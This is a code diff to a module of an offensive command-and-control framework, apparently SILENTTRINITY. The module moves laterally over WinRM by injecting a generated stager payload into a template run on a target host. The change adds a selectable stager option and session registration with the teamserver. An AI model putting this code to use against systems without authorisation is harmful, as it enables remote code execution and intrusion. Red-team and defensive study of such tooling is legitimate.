@@ -10,7 +10,7 @@ class STModule(Module):
         self.language = 'boo'
         self.description = 'Move laterally using winrm'
         self.author = '@byt3bl33d3r'
-        self.references = ["System.Management"]
+        self.references = ["System.Management.Automation"]
         self.options = {
             'Host': {
                 'Description'   :   'Target IP or Hostname',
@@ -41,19 +41,25 @@ class STModule(Module):
                 'Description'   :    'Add target host to the TrustedHost list before executing',
                 'Required'      :    False,
                 'Value'         :    False,
+            },
+            'Stager': {
+                'Description'   :    'Stager to use (Obviously only PowerShell based stagers will work)',
+                'Required'      :    False,
+                'Value'         :    'powershell',
             }
         }
 
     def payload(self):
-        stager = ipc_server.publish_event(events.GET_STAGERS, ('powershell',))
+        stager = ipc_server.publish_event(events.GET_STAGERS, (self.options['Stager']['Value'],))
         listener = ipc_server.publish_event(events.GET_LISTENERS, (self.options['Listener']['Value'],))
 
         if stager and listener:
-            stager.options['AsFunction']['Value'] = False
+            if self.options['Stager']['Value'] == 'powershell':
+                stager.options['AsFunction']['Value'] = False
 
             with open('core/teamserver/modules/boo/src/winrm.boo', 'r') as module_src:
-                stage = stager.generate(listener, as_string=True)
-                stage = stage.replace("$", "\\$")
+                guid, psk, stage = stager.generate(listener)
+                ipc_server.publish_event(events.SESSION_REGISTER, (guid, psk))
 
                 src = module_src.read()
                 src = src.replace('TARGET', self.options['Host']['Value'])
@@ -64,4 +70,4 @@ class STModule(Module):
                 src = src.replace('PAYLOAD', stage)
                 return src
 
-        print_bad('Invalid listener selected')
+        print_bad('Invalid stager/listener selected')
